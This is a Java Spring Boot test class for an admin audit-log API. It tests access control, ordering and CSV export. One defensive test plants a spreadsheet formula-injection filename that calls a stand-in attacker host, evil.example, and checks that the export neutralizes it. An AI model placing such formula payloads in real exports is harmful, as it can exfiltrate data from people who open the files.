package com.example.demo.audit;

import com.example.demo.auth.AppUser;
import com.example.demo.auth.AppUserRepository;
import com.example.demo.auth.Role;
import com.example.demo.auth.TokenService;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.test.context.ActiveProfiles;
import org.springframework.test.web.servlet.MockMvc;

import java.nio.charset.StandardCharsets;
import java.time.Instant;

import static org.assertj.core.api.Assertions.assertThat;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.MOCK)
@AutoConfigureMockMvc
@ActiveProfiles("test")
class AdminAuditLogControllerTest {

    @Autowired
    MockMvc mockMvc;

    @Autowired
    AppUserRepository appUserRepository;

    @Autowired
    TokenService tokenService;

    @Autowired
    AuditLogRepository auditLogRepository;

    private String adminAuthHeader() {
        AppUser admin = appUserRepository.findBySmartIdIdentity("EE-38507030022")
                .orElseThrow(() -> new IllegalStateException("test admin not bootstrapped"));
        return "Bearer " + tokenService.issue(admin);
    }

    private String userAuthHeader() {
        AppUser user = appUserRepository.save(new AppUser("LV-audit-" + System.nanoTime(), "Some User", Role.USER));
        return "Bearer " + tokenService.issue(user);
    }

    @Test
    void rejectsUnauthenticatedRequests() throws Exception {
        mockMvc.perform(get("/api/admin/audit-log"))
                .andExpect(status().isUnauthorized());
    }

    @Test
    void rejectsNonAdminUsers() throws Exception {
        mockMvc.perform(get("/api/admin/audit-log").header("Authorization", userAuthHeader()))
                .andExpect(status().isForbidden());
    }

    @Test
    void listsEntriesNewestFirst() throws Exception {
        auditLogRepository.save(new AuditLogEntry(Instant.now().minusSeconds(60), AuditActionType.CONTRACT_PARSE,
                "EE-1", "Older", null, "older.pdf", "{}", true, null));
        AuditLogEntry newer = auditLogRepository.save(new AuditLogEntry(Instant.now(), AuditActionType.CONTRACT_PARSE,
                "EE-2", "Newer", null, "newer.pdf", "{}", true, null));

        mockMvc.perform(get("/api/admin/audit-log").header("Authorization", adminAuthHeader()))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$[0].id").value(newer.getId()))
                .andExpect(jsonPath("$[0].actorSmartIdIdentity").value("EE-2"));
    }

    @Test
    void csvExportRequiresAdmin() throws Exception {
        mockMvc.perform(get("/api/admin/audit-log/export.csv"))
                .andExpect(status().isUnauthorized());
        mockMvc.perform(get("/api/admin/audit-log/export.csv").header("Authorization", userAuthHeader()))
                .andExpect(status().isForbidden());
    }

    @Test
    void csvExportContainsARowPerEntryWithHeaderAndDiacriticsIntact() throws Exception {
        auditLogRepository.save(new AuditLogEntry(Instant.now(), AuditActionType.CONTRACT_PARSE,
                "EE-3", "Käär OÜ", null, "leping.pdf", "{\"eicCodes\":[\"38ZEE-1000009--Z\"]}", true, null));

        byte[] csvBytes = mockMvc.perform(get("/api/admin/audit-log/export.csv").header("Authorization", adminAuthHeader()))
                .andExpect(status().isOk())
                .andExpect(result -> assertThat(result.getResponse().getContentType()).contains("text/csv"))
                .andReturn().getResponse().getContentAsByteArray();

        String csv = new String(csvBytes, StandardCharsets.UTF_8);
        assertThat(csv).startsWith("\uFEFFid,occurredAt,actionType");
        assertThat(csv).contains("Käär OÜ");
        assertThat(csv).contains("leping.pdf");
    }

    @Test
    void csvExportDefusesALeadingFormulaCharacterInTheAttackerControlledFilename() throws Exception {
        auditLogRepository.save(new AuditLogEntry(Instant.now(), AuditActionType.CONTRACT_PARSE,
                "EE-4", "Attacker", null,
                "=HYPERLINK(\"http://evil.example/steal\",\"x\").pdf",
                null, true, null));

        byte[] csvBytes = mockMvc.perform(get("/api/admin/audit-log/export.csv").header("Authorization", adminAuthHeader()))
                .andExpect(status().isOk())
                .andReturn().getResponse().getContentAsByteArray();

        String csv = new String(csvBytes, StandardCharsets.UTF_8);
        assertThat(csv).doesNotContain("\"=HYPERLINK");
        assertThat(csv).contains("\"'=HYPERLINK");
    }
}
